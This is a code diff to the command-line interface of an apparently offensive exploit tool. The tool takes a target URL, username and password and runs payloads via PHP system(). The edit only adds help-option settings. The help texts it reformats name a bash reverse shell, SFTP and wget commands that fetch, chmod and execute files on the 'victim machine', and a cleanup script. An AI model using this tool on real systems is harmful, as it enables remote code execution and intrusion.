@@ -7,8 +7,10 @@ from furl import furl
 from .logging import log
 from .exploit import Exploit
 
+CONTEXT_SETTINGS = dict(help_option_names=["-h", "--help"])
 
-@cloup.group()
+
+@cloup.group(context_settings=CONTEXT_SETTINGS)
 @cloup.argument("target_url", type=cloup.STRING)
 @cloup.argument("username", type=cloup.STRING)
 @cloup.argument("password", type=cloup.STRING)
@@ -75,7 +77,8 @@ def cli(
 
 
 @cli.command(
-    help="Specify your own payload to be run via PHP system() on the victim machine."
+    context_settings=CONTEXT_SETTINGS,
+    help="Specify your own payload to be run via PHP system() on the victim machine.",
 )
 @cloup.option(
     "--payload",
@@ -87,7 +90,10 @@ def custom_system_payload(context: cloup.Context, payload: str) -> None:
     return context.obj.run(php_system(payload))
 
 
-@cli.command(help="Specify your own PHP payload to be run on the victim machine.")
+@cli.command(
+    context_settings=CONTEXT_SETTINGS,
+    help="Specify your own PHP payload to be run on the victim machine.",
+)
 @cloup.option(
     "--payload",
     required=True,
@@ -111,7 +117,8 @@ def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
 
 
 @cli.command(
-    help="SFTPs to the attacker machine, downloads the specified file to the victim, chmods it, executes it, and cleans it up."
+    context_settings=CONTEXT_SETTINGS,
+    help="SFTPs to the attacker machine, downloads the specified file to the victim, chmods it, executes it, and cleans it up.",
 )
 @cloup.argument(
     "attacker_source",
@@ -196,7 +203,8 @@ def sftp(
 
 
 @cli.command(
-    help="Downloads the file at the specified URL to to the victim, chmods it, executes it, and cleans it up."
+    context_settings=CONTEXT_SETTINGS,
+    help="Downloads the file at the specified URL to to the victim, chmods it, executes it, and cleans it up.",
 )
 @cloup.argument("source_url", help="The URL of the file to download.")
 @cloup.argument(
@@ -212,7 +220,10 @@ def wget(context: cloup.Context, source_url: str, victim_destination: str) -> No
     )
 
 
-@cli.command(help="Runs the cleanup script on the target for given site names.")
+@cli.command(
+    context_settings=CONTEXT_SETTINGS,
+    help="Runs the cleanup script on the target for given site names.",
+)
 @cloup.argument(
     "site_names",
     type=str,
